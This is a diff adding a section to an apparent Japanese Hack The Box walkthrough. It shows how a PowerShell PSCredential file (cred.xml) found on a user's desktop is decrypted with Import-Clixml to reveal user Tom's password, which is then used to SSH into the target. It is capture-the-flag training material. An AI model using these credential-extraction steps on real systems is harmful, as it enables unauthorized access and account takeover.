@@ -132,3 +132,52 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 ![inishell](https://user-images.githubusercontent.com/85237728/198999395-7382a52b-278c-4873-82f7-6f86cb6e3a41.png)
 
+# Tom's shell
+
+C:\Users\nico\DesktopにユーザtomのPSCredentialがあった：
+
+```
+C:\Users\nico\Desktop>dir /a
+
+28/05/2018  20:07    <DIR>          .
+28/05/2018  20:07    <DIR>          ..
+27/10/2017  23:59             1,468 cred.xml
+27/10/2017  22:42               282 desktop.ini
+27/10/2017  23:40                32 user.txt
+27/10/2017  21:34               162 ~$iledDeliveryNotification.doc
+               4 File(s)          1,944 bytes
+               2 Dir(s)  15,742,918,656 bytes free
+
+C:\Users\nico\Desktop>type cred.xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">HTB\Tom</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
+    </Props>
+  </Obj>
+</Objs>
+```
+
+PSCredentialを次のように復号する：
+```
+C:\Users\nico\Desktop> powershell -c "$cred = Import-Clixml -Path .\cred.xml; $cred.GetNetworkCredential() | Format-List"
+
+UserName       : Tom
+Password       : 1ts-mag1c!!!
+SecurePassword : System.Security.SecureString
+Domain         : HTB
+```
+（なぜかPowerShellを起動するとハングするので、上記のようにDosからPowerShellを実行）
+
+SSHがターゲット上で動いていたことを思い出しTomのシェルをとる：
+
+```
+┌──(shoebill㉿shoebill)-[~]
+└─$ ssh tom@10.10.10.77
+```
